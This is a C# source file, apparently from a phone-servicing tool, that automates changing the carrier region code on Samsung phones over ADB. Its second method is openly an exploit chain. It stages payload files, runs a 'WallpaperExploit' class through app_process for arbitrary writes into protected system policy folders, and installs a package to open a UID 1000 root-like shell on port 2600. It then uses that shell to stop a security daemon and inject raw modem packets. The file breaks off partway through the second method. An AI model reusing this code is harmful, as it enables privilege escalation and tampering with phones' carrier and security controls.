using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using GsmTools.Desktop.Core;
using GsmTools.Desktop.Workflows.Models;

namespace GsmTools.Desktop.Workflows;

public enum CscWorkflowMethod
{
    Method1_Standard = 1,
    Method2_PrivilegeEscalationExploit = 2
}

public interface ISamsungCscWorkflow
{
    event Action<string>? OnLog;
    event Action<WorkflowStepProgress>? OnStepChanged;
    event Action<DeviceInfo>? OnDeviceInfoUpdated;

    Task<DeviceInfo> ReadDeviceInfoAsync(Action<string>? logCallback = null, CancellationToken cancellationToken = default);
    Task<CscChangeResult> ExecuteCscChangeAsync(string targetCsc, bool useEncryptedAtSession = false, Action<WorkflowStepProgress>? progressCallback = null, Action<string>? logCallback = null, CancellationToken cancellationToken = default);
    Task<CscChangeResult> ExecuteMethod2Async(string targetCsc, string? artifactsDirectory = null, bool useEncryptedAtSession = false, Action<WorkflowStepProgress>? progressCallback = null, Action<string>? logCallback = null, CancellationToken cancellationToken = default);
}

/// <summary>
/// Orchestrates complete Samsung device identification and CSC change workflow,
/// reproducing the exact chronological events, packets, and safeguards documented in csc 15.txt.
/// </summary>
public class SamsungCscWorkflow : ISamsungCscWorkflow
{
    private readonly IAdbRawSocketClient _adbClient;
    private readonly IPersistentAtBridgeSession _atSession;

    public event Action<string>? OnLog;
    public event Action<WorkflowStepProgress>? OnStepChanged;
    public event Action<DeviceInfo>? OnDeviceInfoUpdated;

    public SamsungCscWorkflow(IAdbRawSocketClient adbClient, IPersistentAtBridgeSession atSession)
    {
        _adbClient = adbClient ?? throw new ArgumentNullException(nameof(adbClient));
        _atSession = atSession ?? throw new ArgumentNullException(nameof(atSession));
    }

    /// <summary>
    /// Executes the 8 forensic pre-checks matching csc 15.txt (lines 7-130).
    /// </summary>
    public async Task<DeviceInfo> ReadDeviceInfoAsync(Action<string>? logCallback = null, CancellationToken cancellationToken = default)
    {
        void Log(string message)
        {
            string formatted = $"[{DateTime.Now:HH:mm:ss.fff}] {message}";
            logCallback?.Invoke(formatted);
            OnLog?.Invoke(formatted);
        }

        Log("Starting comprehensive device telemetry acquisition...");

        // Ensure connected to local ADB server
        if (!_adbClient.IsConnected)
        {
            Log("Connecting to ADB server at 127.0.0.1:5037...");
            await _adbClient.ConnectAsync(cancellationToken: cancellationToken);
            await _adbClient.SelectDeviceAsync(cancellationToken: cancellationToken);
        }

        // 1. Check Carrier RSU App
        Log("OUT -> shell:pm list package|grep rsuapp");
        string rsuRaw = await _adbClient.ExecuteShellCommandAsync("pm list package|grep rsuapp", false, cancellationToken);
        Log($"IN <- {rsuRaw.Trim()}");
        bool hasRsuApp = rsuRaw.Contains("rsuapp", StringComparison.OrdinalIgnoreCase);

        // 2. Check tsdaemon
        Log("OUT -> shell:ps -A|grep tsdaemon;ps|grep tsdaemon");
        string tsdaemonRaw = await _adbClient.ExecuteShellCommandAsync("ps -A|grep tsdaemon;ps|grep tsdaemon", false, cancellationToken);
        Log($"IN <- {tsdaemonRaw.Trim()}");
        bool hasTsdaemon = tsdaemonRaw.Contains("tsdaemon", StringComparison.OrdinalIgnoreCase);

        // 3. getprop System Telemetry
        Log("OUT -> shell:getprop");
        string getpropRaw = await _adbClient.ExecuteShellCommandAsync("getprop", false, cancellationToken);
        var props = ParseGetProp(getpropRaw);

        string model = GetPropValue(props, "ro.product.model", "Unknown");
        string serial = GetPropValue(props, "ro.boot.serialno", GetPropValue(props, "ro.serialno", "Unknown"));
        string currentCsc = GetPropValue(props, "ro.csc.sales_code", "Unknown");
        string productCode = GetPropValue(props, "ril.product_code", "Unknown");
        string buildNumber = GetPropValue(props, "ro.build.display.id", GetPropValue(props, "ro.build.version.incremental", "Unknown"));
        string androidVer = GetPropValue(props, "ro.build.version.release", "Unknown");
        string securityPatch = GetPropValue(props, "ro.build.version.security_patch", "Unknown");
        string usbConfig = GetPropValue(props, "sys.usb.config", "Unknown");

        Log($"[ADB-GETPROP-SUMMARY] ro.product.model={model} | ro.boot.serialno={serial} | ro.csc.sales_code={currentCsc}");

        // 4. IMEI via iphonesubinfo Parcel Dump
        Log("OUT -> shell:service call iphonesubinfo 1 s16 com.android.shell");
        string imeiRaw = await _adbClient.ExecuteShellCommandAsync("service call iphonesubinfo 1 s16 com.android.shell", false, cancellationToken);
        Log($"IN <- {imeiRaw.Trim()}");
        string imei = ImeiParcelParser.ParseImeiFromParcelDump(imeiRaw);
        Log($"Decoded IMEI: {imei}");

        // 5. SELinux Status
        Log("OUT -> shell:getenforce");
        string selinuxRaw = await _adbClient.ExecuteShellCommandAsync("getenforce", false, cancellationToken);
        Log($"IN <- {selinuxRaw.Trim()}");
        bool isSelinuxEnforcing = selinuxRaw.Contains("Enforcing", StringComparison.OrdinalIgnoreCase);

        // 6. KEYTool.SRV4 presence
        Log("OUT -> shell:pm path KEYTool.SRV4");
        string keytoolRaw = await _adbClient.ExecuteShellCommandAsync("pm path KEYTool.SRV4", false, cancellationToken);
        Log($"IN <- {keytoolRaw.Trim()}");
        bool hasKeyTool = keytoolRaw.Contains("package:", StringComparison.OrdinalIgnoreCase);

        // 7. Port 2600 UID 1000 availability
        Log("OUT -> shell:echo 'id' |toybox nc localhost 2600");
        string port2600Raw = await _adbClient.ExecuteShellCommandAsync("echo 'id' |toybox nc localhost 2600", false, cancellationToken);
        Log($"IN <- {port2600Raw.Trim()}");
        bool port2600Available = port2600Raw.Contains("uid=1000", StringComparison.OrdinalIgnoreCase);

        // 8. Diagnostic Packages (repaircal, mobiledoctor, retailagent)
        Log("OUT -> shell:dumpsys package com.samsung.android.app.repaircal | grep -E \"versionName|versionCode\"");
        string repairCalRaw = await _adbClient.ExecuteShellCommandAsync("dumpsys package com.samsung.android.app.repaircal | grep -E \"versionName|versionCode\"", false, cancellationToken);
        string repairCalVer = ExtractVersion(repairCalRaw);

        Log("OUT -> shell:dumpsys package com.samsung.android.app.mobiledoctor | grep -E \"versionName|versionCode\"");
        string mobileDocRaw = await _adbClient.ExecuteShellCommandAsync("dumpsys package com.samsung.android.app.mobiledoctor | grep -E \"versionName|versionCode\"", false, cancellationToken);
        string mobileDocVer = ExtractVersion(mobileDocRaw);

        Log("OUT -> shell:dumpsys package com.samsung.rms.retailagent.global | grep -E \"versionName|versionCode\"");
        string retailAgentRaw = await _adbClient.ExecuteShellCommandAsync("dumpsys package com.samsung.rms.retailagent.global | grep -E \"versionName|versionCode\"", false, cancellationToken);
        string retailAgentVer = ExtractVersion(retailAgentRaw);

        // Telemetry & SIM/Network Lock Inspection
        string simCardStatus = GetPropValue(props, "gsm.sim.state", "ABSENT");
        string simOperator = GetPropValue(props, "gsm.sim.operator.alpha", "");
        if (!string.IsNullOrEmpty(simOperator))
            simCardStatus = $"{simCardStatus} ({simOperator})";

        string networkLockStatus = "Unknown";
        Log($"IN <- SIM Card State: {simCardStatus}");

        try
        {
            string atProbe = await _adbClient.ExecuteShellCommandAsync("if [ -w /dev/umts_atc0 ]; then echo -e 'AT+CLCK=\"PN\",2\\r' > /dev/umts_atc0; head -n 5 /dev/umts_atc0 2>/dev/null; fi", false, cancellationToken);
            if (atProbe.Contains("+CLCK: 0") || atProbe.Contains("+CLCK:0"))
            {
                networkLockStatus = "UNLOCKED (0)";
            }
            else if (atProbe.Contains("+CLCK: 1") || atProbe.Contains("+CLCK:1"))
            {
                networkLockStatus = "LOCKED (1)";
            }
        }
        catch
        {
            // Ignore if shell doesn't have direct /dev/ access
        }

        if (networkLockStatus == "Unknown")
        {
            if (hasRsuApp)
            {
                networkLockStatus = "Carrier RSU Lock (App Detected)";
            }
            else if (simCardStatus.Contains("NETWORK_LOCKED", StringComparison.OrdinalIgnoreCase))
            {
                networkLockStatus = "LOCKED (Network Locked)";
            }
            else if (simCardStatus.StartsWith("LOADED", StringComparison.OrdinalIgnoreCase) || simCardStatus.StartsWith("READY", StringComparison.OrdinalIgnoreCase))
            {
                networkLockStatus = "UNLOCKED / Active";
            }
            else
            {
                networkLockStatus = "No SIM / Absent";
            }
        }

        Log($"IN <- Network Personalization Lock: {networkLockStatus}");

        var info = new DeviceInfo(
            model,
            serial,
            imei,
            currentCsc,
            productCode,
            buildNumber,
            androidVer,
            securityPatch,
            usbConfig,
            isSelinuxEnforcing,
            hasRsuApp,
            hasTsdaemon,
            hasKeyTool,
            port2600Available,
            repairCalVer,
            mobileDocVer,
            retailAgentVer,
            "NONE",
            simCardStatus,
            networkLockStatus
        );

        OnDeviceInfoUpdated?.Invoke(info);
        Log("Device telemetry acquisition completed successfully.");
        return info;
    }

    /// <summary>
    /// Executes the complete 5-command CSC change injection matching csc 15.txt.
    /// </summary>
    public async Task<CscChangeResult> ExecuteCscChangeAsync(string targetCsc, bool useEncryptedAtSession = false, Action<WorkflowStepProgress>? progressCallback = null, Action<string>? logCallback = null, CancellationToken cancellationToken = default)
    {
        var sw = Stopwatch.StartNew();
        var executionLog = new List<string>();

        void Log(string message)
        {
            string formatted = $"[{DateTime.Now:HH:mm:ss.fff}] {message}";
            executionLog.Add(formatted);
            logCallback?.Invoke(formatted);
            OnLog?.Invoke(formatted);
        }

        void ReportProgress(int step, int total, string name, string msg)
        {
            double pct = (double)step / total * 100.0;
            var prog = new WorkflowStepProgress(step, total, name, msg, pct);
            progressCallback?.Invoke(prog);
            OnStepChanged?.Invoke(prog);
            Log($"[STEP {step}/{total}] {name}: {msg}");
        }

        try
        {
            // Step 1: Validate CSC
            ReportProgress(1, 8, "CSC Validation", $"Validating target CSC: '{targetCsc}'");
            string cleanCsc = targetCsc.Trim().ToUpperInvariant();
            if (cleanCsc.Length != 3 || !Regex.IsMatch(cleanCsc, "^[A-Z]{3}$"))
            {
                throw new ArgumentException($"Invalid CSC code '{targetCsc}'. Must be exactly 3 uppercase letters (e.g. XAA, USC, TMB, ATT).", nameof(targetCsc));
            }

            string hexCsc = Convert.ToHexString(Encoding.ASCII.GetBytes(cleanCsc));
            Log($"Target CSC converted to ASCII hex: '{cleanCsc}' -> {hexCsc}");

            // Step 2: Initial Device Audit
            ReportProgress(2, 8, "Device Audit", "Running pre-check audit...");
            var devInfo = await ReadDeviceInfoAsync(logCallback, cancellationToken);
            string oldCsc = devInfo.CurrentCsc;

            // Step 3: UID 1000 Bridge Readiness & ssud termination
            ReportProgress(3, 8, "Privilege Escalation", "Checking port 2600 UID 1000 bridge readiness...");
            string portCheck = await _adbClient.ExecuteShellCommandAsync("echo 'id' |toybox nc localhost 2600", false, cancellationToken);

            if (!portCheck.Contains("uid=1000"))
            {
                Log("Port 2600 refused or not returning uid=1000. Running stayon and diagnostic package readiness...");
                await _adbClient.ExecuteShellCommandAsync("svc power stayon true", false, cancellationToken);

                // Check packages as documented in csc 15.txt lines 1019-1035
                await _adbClient.ExecuteShellCommandAsync("dumpsys package com.samsung.android.app.repaircal | grep -E \"versionName|versionCode\"", false, cancellationToken);
                await _adbClient.ExecuteShellCommandAsync("dumpsys package com.samsung.android.app.mobiledoctor | grep -E \"versionName|versionCode\"", false, cancellationToken);
                await _adbClient.ExecuteShellCommandAsync("dumpsys package com.samsung.rms.retailagent.global | grep -E \"versionName|versionCode\"", false, cancellationToken);

                // Polling loop for port 2600 (up to 30 seconds, 500ms intervals)
                bool confirmed = false;
                for (int i = 0; i < 60 && !cancellationToken.IsCancellationRequested; i++)
                {
                    string pollCheck = await _adbClient.ExecuteShellCommandAsync("echo 'id' |toybox nc localhost 2600", false, cancellationToken);
                    if (pollCheck.Contains("uid=1000"))
                    {
                        confirmed = true;
                        Log(".UID 1000 confirmed..");
                        break;
                    }
                    await Task.Delay(500, cancellationToken);
                }

                if (!confirmed)
                {
                    Log("Notice: Port 2600 UID 1000 could not be confirmed within timeout. Continuing with direct shell session...");
                }
            }
            else
            {
                Log(".UID 1000 confirmed..");
            }

            // Stop ssud via port 2600 as in csc 15.txt
            Log("Stopping ssud daemon via port 2600...");
            await _adbClient.ExecuteShellCommandAsync("echo 'setprop ctl.stop ssud'|toybox nc localhost 2600", false, cancellationToken);

            // Step 4: Push and Start AT Bridge
            ReportProgress(4, 8, "Bridge Deployment", "Deploying /data/local/tmp/AT via native sync protocol...");
            string localAtBinary = FindLocalAtBinary();
            Log($"Found local AT binary at: {localAtBinary}");

            await _adbClient.PushFileSyncAsync(localAtBinary, "/data/local/tmp/AT", 33188, (sent, total) =>
            {
                Log($"Sync push progress: {sent}/{total} bytes ({(double)sent / total * 100:F1}%)");
            }, cancellationToken);

            Log("OUT -> shell:chmod 777 /data/local/tmp/AT");
            await _adbClient.ExecuteShellCommandAsync("chmod 777 /data/local/tmp/AT", false, cancellationToken);

            uint sessionSeed = 0;
            if (useEncryptedAtSession)
            {
                sessionSeed = (uint)RandomNumberGenerator.GetInt32(1, int.MaxValue);
                Log($"Encrypted AT session active with dynamic seed: 0x{sessionSeed:X8}");
            }
            else
            {
                Log("Plaintext Raw Hex Mode active (matching csc 15.txt exactly).");
            }

            Log("OUT -> shell:/data/local/tmp/AT (starting interactive session)");
            var banner = await _atSession.StartSessionAsync(_adbClient.CurrentSerial, sessionSeed, cancellationToken);
            Log($"AT Bridge Connected: Model={banner.Model}, CSC={banner.Csc}, Channel={banner.ActiveChannel}, UID={banner.Uid}");

            // Step 5: Flush Radio Logcat
            ReportProgress(5, 8, "Logcat Flush", "Flushing radio logcat buffer...");
            Log("OUT -> shell:logcat -b radio -c");
            await _adbClient.ExecuteShellCommandAsync("logcat -b radio -c", false, cancellationToken);

            // Step 6: 5-Command CSC Injection Sequence
            ReportProgress(6, 8, "CSC Injection", $"Injecting 5-packet sequence for CSC: {cleanCsc} ({hexCsc})...");

            // Packet 1: 0601000E0000{hexCsc}0000{hexCsc}
            string pkt1 = $"0601000E0000{hexCsc}0000{hexCsc}";
            Log($"OUT -> [IPC 1/5]: {pkt1}");
            string resp1 = await _atSession.SendIpcHexCommandAsync(pkt1, cancellationToken);
            Log($"IN <- [IPC 1/5 Response]: .OK..{resp1}#");

            // Packet 2: 060100090000{hexCsc}
            string pkt2 = $"060100090000{hexCsc}";
            Log($"OUT -> [IPC 2/5]: {pkt2}");
            string resp2 = await _atSession.SendIpcHexCommandAsync(pkt2, cancellationToken);
            Log($"IN <- [IPC 2/5 Response]: .OK..{resp2}#");

            // Packet 3: 060100120000{hexCsc}0000{hexCsc}{hexCsc}
            string pkt3 = $"060100120000{hexCsc}0000{hexCsc}{hexCsc}";
            Log($"OUT -> [IPC 3/5]: {pkt3}");
            string resp3 = await _atSession.SendIpcHexCommandAsync(pkt3, cancellationToken);
            Log($"IN <- [IPC 3/5 Response]: .OK..{resp3}#");

            // Packet 4: 060100120000
            string pkt4 = "060100120000";
            Log($"OUT -> [IPC 4/5]: {pkt4}");
            string resp4 = await _atSession.SendIpcHexCommandAsync(pkt4, cancellationToken);
            Log($"IN <- [IPC 4/5 Response]: .OK..{resp4}#");

            // Packet 5: 060100090000{hexCsc}
            string pkt5 = $"060100090000{hexCsc}";
            Log($"OUT -> [IPC 5/5]: {pkt5}");
            string resp5 = await _atSession.SendIpcHexCommandAsync(pkt5, cancellationToken);
            Log($"IN <- [IPC 5/5 Response]: .OK..{resp5}#");

            // Close AT session
            Log("Terminating AT Bridge session (EXIT)...");
            await _atSession.TerminateSessionAsync(cancellationToken);

            // Step 7: Post-Cleanup
            ReportProgress(7, 8, "Cleanup", "Executing post-change package cleanup...");
            string cleanupCmd = "pm uninstall -k --user 0 com.sec.android.AutoPreconfig;pm uninstall -k --user 0 com.sec.omadmspr;pm clear com.samsung.android.app.mobiledoctor";
            Log($"OUT -> shell:{cleanupCmd}");
            string cleanupResp = await _adbClient.ExecuteShellCommandAsync(cleanupCmd, false, cancellationToken);
            Log($"IN <- {cleanupResp.Trim()}");

            // Step 8: USB Mode Reset
            ReportProgress(8, 8, "USB Reset", "Sending direct ADB protocol USB reset (0004usb:)...");
            Log("OUT -> 0004usb:");
            string usbResetResp = await _adbClient.RestartUsbModeAsync(cancellationToken);
            Log($"IN <- {usbResetResp}");

            sw.Stop();
            ReportProgress(8, 8, "Complete", $"CSC successfully changed from {oldCsc} to {cleanCsc} in {sw.Elapsed.TotalSeconds:F2}s.");

            return new CscChangeResult(
                Success: true,
                OldCsc: oldCsc,
                NewCsc: cleanCsc,
                Message: $"CSC successfully changed to {cleanCsc} in {sw.Elapsed.TotalSeconds:F1}s.",
                Duration: sw.Elapsed,
                ExecutionLog: executionLog
            );
        }
        catch (Exception ex)
        {
            sw.Stop();
            Log($"ERROR: CSC change workflow failed: {ex.Message}");
            return new CscChangeResult(
                Success: false,
                OldCsc: "Unknown",
                NewCsc: targetCsc,
                Message: $"Workflow failed: {ex.Message}",
                Duration: sw.Elapsed,
                ExecutionLog: executionLog
            );
        }
    }

    /// <summary>
    /// Executes the complete 14-step Method 2 privilege escalation, retail policy exploit, and CSC injection workflow matching 33.txt.
    /// Uses artifacts (SRV4, ADP.xml, ASKSW.xml, classes.dex, trustedTime, R2.zip, AT) from folder '2'.
    /// </summary>
    public async Task<CscChangeResult> ExecuteMethod2Async(
        string targetCsc,
        string? artifactsDirectory = null,
        bool useEncryptedAtSession = false,
        Action<WorkflowStepProgress>? progressCallback = null,
        Action<string>? logCallback = null,
        CancellationToken cancellationToken = default)
    {
        var sw = Stopwatch.StartNew();
        var executionLog = new List<string>();

        void Log(string message)
        {
            string formatted = $"[{DateTime.Now:HH:mm:ss.fff}] {message}";
            executionLog.Add(formatted);
            logCallback?.Invoke(formatted);
            OnLog?.Invoke(formatted);
        }

        void ReportProgress(int step, int total, string name, string msg)
        {
            double pct = (double)step / total * 100.0;
            var prog = new WorkflowStepProgress(step, total, name, msg, pct);
            progressCallback?.Invoke(prog);
            OnStepChanged?.Invoke(prog);
            Log($"[STEP {step}/{total}] {name}: {msg}");
        }

        try
        {
            // Step 1: CSC Code Validation
            ReportProgress(1, 14, "CSC Validation", $"Validating target CSC: '{targetCsc}'");
            string cleanCsc = targetCsc.Trim().ToUpperInvariant();
            if (cleanCsc.Length != 3 || !Regex.IsMatch(cleanCsc, "^[A-Z]{3}$"))
            {
                throw new ArgumentException($"Invalid CSC code '{targetCsc}'. Must be exactly 3 uppercase letters (e.g. XAA, USC, TMB, ATT).", nameof(targetCsc));
            }

            string hexCsc = Convert.ToHexString(Encoding.ASCII.GetBytes(cleanCsc));
            Log($"Target CSC converted to ASCII hex: '{cleanCsc}' -> {hexCsc}");

            // Step 2: Artifacts Verification
            ReportProgress(2, 14, "Artifacts Verification", "Resolving and verifying required Method 2 exploit payload files from folder '2'...");
            string srv4Local = FindArtifactPath("SRV4", artifactsDirectory);
            string adpLocal = FindArtifactPath("ADP.xml", artifactsDirectory);
            string askswLocal = FindArtifactPath("ASKSW.xml", artifactsDirectory);
            string dexLocal = FindArtifactPath("classes.dex", artifactsDirectory);
            string trustedTimeLocal = FindArtifactPath("trustedTime", artifactsDirectory);
            string r2ZipLocal = FindArtifactPath("R2.zip", artifactsDirectory);
            string atLocal = FindLocalAtBinary();

            Log($"Artifacts verified: SRV4={Path.GetFileName(srv4Local)}, ADP={Path.GetFileName(adpLocal)}, ASKSW={Path.GetFileName(askswLocal)}, classes.dex={Path.GetFileName(dexLocal)}, trustedTime={Path.GetFileName(trustedTimeLocal)}, R2.zip={Path.GetFileName(r2ZipLocal)}, AT={Path.GetFileName(atLocal)}");

            // Step 3: Initial Device Audit (33.txt lines 1-30)
            ReportProgress(3, 14, "Device Audit", "Running pre-check audit (33.txt lines 1-30)...");
            var devInfo = await ReadDeviceInfoAsync(logCallback, cancellationToken);
            string oldCsc = devInfo.CurrentCsc;

            // Step 4: KEYTool.SRV4 Inspection & Installation (33.txt lines 32-41)
            ReportProgress(4, 14, "KEYTool.SRV4 Readiness", "Checking KEYTool.SRV4 presence on device (33.txt line 32)...");
            Log("OUT -> shell:pm path KEYTool.SRV4");
            string keyToolCheck = await _adbClient.ExecuteShellCommandAsync("pm path KEYTool.SRV4", false, cancellationToken);
            Log($"IN <- {keyToolCheck.Trim()}");

            if (!keyToolCheck.Contains("package:"))
            {
                Log("Deploying SRV4 payload via ADB sync to /data/local/tmp/SRV4...");
                await _adbClient.PushFileSyncAsync(srv4Local, "/data/local/tmp/SRV4", 33188, (sent, total) =>
                {
                    Log($"SRV4 sync push: {sent}/{total} bytes ({(double)sent / total * 100:F1}%)");
                }, cancellationToken);

                Log("OUT -> shell:chmod 777 /data/local/tmp/SRV4");
                await _adbClient.ExecuteShellCommandAsync("chmod 777 /data/local/tmp/SRV4", false, cancellationToken);

                Log("OUT -> shell:pm install -r /data/local/tmp/SRV4");
                string srv4InstallResp = await _adbClient.ExecuteShellCommandAsync("pm install -r /data/local/tmp/SRV4", false, cancellationToken);
                Log($"IN <- {srv4InstallResp.Trim()}");
            }
            else
            {
                Log("KEYTool.SRV4 is already installed on device.");
            }

            // Step 5: Port 2600 Privileged Bridge & Stayon (33.txt lines 44-47, CSC16.txt lines 48-50)
            ReportProgress(5, 14, "Privilege Escalation", "Testing port 2600 UID 1000 bridge readiness (33.txt line 44)...");
            Log("OUT -> shell:echo 'id' |toybox nc localhost 2600");
            string port2600Resp = await _adbClient.ExecuteShellCommandAsync("echo 'id' |toybox nc localhost 2600", false, cancellationToken);
            Log($"IN <- {port2600Resp.Trim()}");

            Log("OUT -> shell:svc power stayon true");
            await _adbClient.ExecuteShellCommandAsync("svc power stayon true", false, cancellationToken);

            bool portAlreadyActive = port2600Resp.Contains("uid=1000");
            if (portAlreadyActive)
            {
                Log("UID 1000 bridge on port 2600 is already active and confirmed! Preserving running privilege session (CSC16.txt lines 43-50)...");
                ReportProgress(6, 14, "Package Telemetry", "UID 1000 active: skipping diagnostic package dumpsys.");
                ReportProgress(7, 14, "Exploit Staging", "UID 1000 active: skipping exploit payload staging.");
                ReportProgress(8, 14, "AASA Policy Injection", "UID 1000 active: skipping WallpaperExploit injection.");
                ReportProgress(9, 14, "R2 Deployment", "UID 1000 active: skipping R2 reinstallation.");
                ReportProgress(10, 14, "UID 1000 Verification", "UID 1000 escalation bridge verified and ready.");
            }
            else
            {
                // Step 6: Diagnostic Packages Audit (33.txt lines 50-62)
                ReportProgress(6, 14, "Package Telemetry", "Auditing repaircal, mobiledoctor, and retailagent global packages (33.txt lines 50-62)...");
                string[] diagCommands = new[]
                {
                    "dumpsys package com.samsung.android.app.repaircal | grep -E \"versionName|versionCode\"",
                    "dumpsys package com.samsung.android.app.mobiledoctor | grep -E \"versionName|versionCode\"",
                    "dumpsys package com.samsung.rms.retailagent.global | grep -E \"versionName|versionCode\"",
                    "dumpsys package com.samsung.rms.retailagent.global_lite | grep -E \"versionName|versionCode\"",
                    "dumpsys package com.samsung.android.app.repaircal | grep -E \"versionName|versionCode\""
                };

                foreach (var cmd in diagCommands)
                {
                    Log($"OUT -> shell:{cmd}");
                    string diagResp = await _adbClient.ExecuteShellCommandAsync(cmd, false, cancellationToken);
                    if (!string.IsNullOrWhiteSpace(diagResp))
                        Log($"IN <- {diagResp.Trim()}");
                }

                // Step 7: Staging Retail Exploit Payload (33.txt lines 65-78)
                ReportProgress(7, 14, "Exploit Staging", "Staging genuine Samsung AASA policy exploit files under /data/local/tmp/retail/ (33.txt lines 65-78)...");

                // Push ADP.xml
                await _adbClient.PushFileSyncAsync(adpLocal, "/data/local/tmp/retail/ADP.xml", 33188, null, cancellationToken);
                Log("OUT -> shell:chmod 777 /data/local/tmp/retail/ADP.xml");
                await _adbClient.ExecuteShellCommandAsync("chmod 777 /data/local/tmp/retail/ADP.xml", false, cancellationToken);

                // Push ASKSW.xml
                await _adbClient.PushFileSyncAsync(askswLocal, "/data/local/tmp/retail/ASKSW.xml", 33188, null, cancellationToken);
                Log("OUT -> shell:chmod 777 /data/local/tmp/retail/ASKSW.xml");
                await _adbClient.ExecuteShellCommandAsync("chmod 777 /data/local/tmp/retail/ASKSW.xml", false, cancellationToken);

                // Push classes.dex
                await _adbClient.PushFileSyncAsync(dexLocal, "/data/local/tmp/retail/classes.dex", 33188, null, cancellationToken);
                Log("OUT -> shell:chmod 777 /data/local/tmp/retail/classes.dex");
                await _adbClient.ExecuteShellCommandAsync("chmod 777 /data/local/tmp/retail/classes.dex", false, cancellationToken);

                // Push trustedTime
                await _adbClient.PushFileSyncAsync(trustedTimeLocal, "/data/local/tmp/retail/trustedTime", 33188, null, cancellationToken);
                Log("OUT -> shell:chmod 777 /data/local/tmp/retail/trustedTime");
                await _adbClient.ExecuteShellCommandAsync("chmod 777 /data/local/tmp/retail/trustedTime", false, cancellationToken);

                // Step 8: Trigger WallpaperExploit Arbitrary Write (33.txt line 80)
                ReportProgress(8, 14, "AASA Policy Injection", "Executing WallpaperExploit to inject policy files into /data/system/.aasa/ (33.txt line 80)...");
                string exploitCmd = "chmod 0777 /data/local/tmp/retail/*;" +
                    "CLASSPATH=/data/local/tmp/retail/classes.dex app_process /system/bin --nice-name=system_server com.hacker.tool.WallpaperExploit /data/local/tmp/retail/ADP.xml /data/system/.aasa/AASApolicy/ADP.xml;" +
                    "CLASSPATH=/data/local/tmp/retail/classes.dex app_process /system/bin --nice-name=system_server com.hacker.tool.WallpaperExploit /data/local/tmp/retail/trustedTime /data/system/.aasa/trustedTime;" +
                    "CLASSPATH=/data/local/tmp/retail/classes.dex app_process /system/bin --nice-name=system_server com.hacker.tool.WallpaperExploit /data/local/tmp/retail/ASKSW.xml /data/system/.aasa/AASApolicy/ASKSW.xml";

                Log($"OUT -> shell:{exploitCmd}");
                string exploitResp = await _adbClient.ExecuteShellCommandAsync(exploitCmd, false, cancellationToken);
                Log($"IN <- {exploitResp.Trim()}");

                Log("OUT -> shell:rm -rf /data/local/tmp/retail");
                await _adbClient.ExecuteShellCommandAsync("rm -rf /data/local/tmp/retail", false, cancellationToken);

                // Step 9: Deploy R2 Package (33.txt lines 86-101)
                ReportProgress(9, 14, "R2 Deployment", "Deploying and installing R2 package (33.txt lines 86-101)...");
                await _adbClient.PushFileSyncAsync(r2ZipLocal, "/data/local/tmp/R2.zip", 33188, null, cancellationToken);

                Log("OUT -> shell:unzip /data/local/tmp/R2.zip -o -d /data/local/tmp/");
                await _adbClient.ExecuteShellCommandAsync("unzip /data/local/tmp/R2.zip -o -d /data/local/tmp/", false, cancellationToken);

                Log("OUT -> shell:rm -r /data/local/tmp/R2.zip");
                await _adbClient.ExecuteShellCommandAsync("rm -r /data/local/tmp/R2.zip", false, cancellationToken);

                Log("OUT -> shell:chmod 777 /data/local/tmp/R2");
                await _adbClient.ExecuteShellCommandAsync("chmod 777 /data/local/tmp/R2", false, cancellationToken);

                Log("OUT -> shell:pm install -r /data/local/tmp/R2");
                string r2InstallResp = await _adbClient.ExecuteShellCommandAsync("pm install -r /data/local/tmp/R2", false, cancellationToken);
                Log($"IN <- {r2InstallResp.Trim()}");

                Log("OUT -> shell:rm -r /data/local/tmp/R2");
                await _adbClient.ExecuteShellCommandAsync("rm -r /data/local/tmp/R2", false, cancellationToken);

                // Step 10: Port 2600 UID 1000 Escalation Verification (CSC16.txt line 217)
                ReportProgress(10, 14, "UID 1000 Verification", "Waiting for Samsung Retail Mode to finish policy processing and open port 2600 (CSC16.txt line 217)...");
                bool uidConfirmed = false;
                for (int i = 0; i < 90 && !cancellationToken.IsCancellationRequested; i++)
                {
                    string idCheck = await _adbClient.ExecuteShellCommandAsync("echo 'id' |toybox nc localhost 2600", false, cancellationToken);
                    if (idCheck.Contains("uid=1000"))
                    {
                        uidConfirmed = true;
                        Log($"IN <- {idCheck.Trim()}");
                        Log("UID 1000 confirmed.");
                        break;
                    }
                    if (i % 5 == 0)
                    {
                        Log($"Waiting for Retail Mode policy activation... ({i + 1}/90s)");
                    }
                    await Task.Delay(1000, cancellationToken);
                }

                if (!uidConfirmed)
                {
                    throw new InvalidOperationException("Port 2600 UID 1000 escalation bridge could not be confirmed within 90s timeout. Retail Mode did not activate the bridge.");
                }
            }

            // Step 11: Stop ssud Daemon & Start AT Bridge Session (CSC16.txt lines 219-238)
            ReportProgress(11, 14, "Primary AT Session", "Stopping ssud daemon via port 2600 and deploying AT bridge (CSC16.txt lines 219-238)...");
            Log("OUT -> shell:echo 'setprop ctl.stop ssud'|toybox nc localhost 2600");
            string ssudResp = await _adbClient.ExecuteShellCommandAsync("echo 'setprop ctl.stop ssud'|toybox nc localhost 2600", false, cancellationToken);
            if (!string.IsNullOrWhiteSpace(ssudResp))
                Log($"IN <- {ssudResp.Trim()}");

            await _adbClient.PushFileSyncAsync(atLocal, "/data/local/tmp/AT", 33188, null, cancellationToken);
            Log("OUT -> shell:chmod 777 /data/local/tmp/AT");
            await _adbClient.ExecuteShellCommandAsync("chmod 777 /data/local/tmp/AT", false, cancellationToken);

            uint sessionSeed = 0;
            if (useEncryptedAtSession)
            {
                sessionSeed = (uint)RandomNumberGenerator.GetInt32(1, int.MaxValue);
                Log($"Encrypted AT session active with dynamic seed: 0x{sessionSeed:X8}");
            }

            Log("OUT -> shell:/data/local/tmp/AT");
            var mainBanner = await _atSession.StartSessionAsync(_adbClient.CurrentSerial, sessionSeed, "/data/local/tmp/AT", cancellationToken);
            Log($"Main AT Bridge Connected: Model={mainBanner.Model}, CSC={mainBanner.Csc}, Channel={mainBanner.ActiveChannel}, UID={mainBanner.Uid}");

            // Step 12: Flush Radio Logcat & Inject 5 CSC Packets (33.txt lines 131-147)
            ReportProgress(12, 14, "CSC Injection", $"Flushing radio logcat and injecting 5-packet sequence for CSC: {cleanCsc} ({hexCsc})...");
            Log("OUT -> shell:logcat -b radio -c");
            await _adbClient.ExecuteShellCommandAsync("logcat -b radio -c", false, cancellationToken);

            // Packet 1: 0601000E0000{hexCsc}0000{hexCsc}
            string pkt1 = $"0601000E0000{hexCsc}0000{hexCsc}";
